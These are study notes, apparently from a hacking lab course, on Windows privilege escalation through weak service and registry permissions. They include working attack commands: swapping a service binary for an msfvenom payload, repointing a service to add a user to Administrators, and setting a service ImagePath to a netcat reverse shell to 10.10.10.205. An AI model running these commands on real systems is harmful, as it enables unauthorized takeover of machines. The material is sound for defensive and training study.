
## Tables of Content:

- [[#Permissive File System ACLs - Modifiable Binary]]
- [[#Weak Service Permissions - Modifiable Service]]
- [[#Permissive Registry ACLs]]
- [[#Modifiable Registry Autorun Binary]]
- [[#Unquoted Service Path]]

---

## Permissive File System ACLs - Modifiable Binary

[SharpUp](https://github.com/GhostPack/SharpUp/) (GhostPack suite) checks for service binaries suffering from weak ACLs.

```PowerShell
PS C:\htb> .\SharpUp.exe audit
### Running SharpUp

PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
### Checking permissions with icacls verifying Everyone and BUILTIN\Users access

C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
### Replacing Service Binary with a vulnerable one of our from msfvenom

C:\htb> sc start SecurityService
### Exploiting the binary
```

---

## Weak Service Permissions - Modifiable Service

[AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite can enumerate permissions on a service.

```PowerShell
PS C:\htb> .\SharpUp.exe audit
### Running SharpUp

C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
### Enumerating Permissions. -q:omit banner, -u:suppress errors, -v:verbose, -c:specify name of a Windows service, -w:show only objects that have write access

C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
### Changing Service Binary Path to add our user to Administrator group

C:\htb> sc stop WindscribeService
C:\htb> sc start WindscribeService
### Restarting the service (will fail as expected)
```

Another example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing OS updates. Before [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`.

### Weak Service Permissions - Cleanup

```PowerShell
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
### Reverting binary path

C:\htb> sc start WindScribeService
C:\htb> sc query WindScribeService
### Starting and verifying the service again
```

---

## Permissive Registry ACLs

```PowerShell
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
### Checking for Weak Service ACLs in Registry

PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
### Changing ImagePath using PowerShell cmdlet Set-ItemProperty
```

---

## Modifiable Registry Autorun Binary

Suppose we have write permissions to the registry for a given startup binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in. [Post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html), [Site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail potential auto-run locations on Windows systems.

```PowerShell
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
### Checking Startup Programs
```

---

## Unquoted Service Path

```PowerShell
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
### Looking for Unquoted Service Path
```

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders.

### Service Binary Path

```sh
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

If we can create the following files, we would be able to hijack the service binary and gain CE in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.

- `C:\Program.exe`
- `C:\Program Files (x86)\System.exe`

Even if the system had been misconfigured to allow this, the user wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges.

---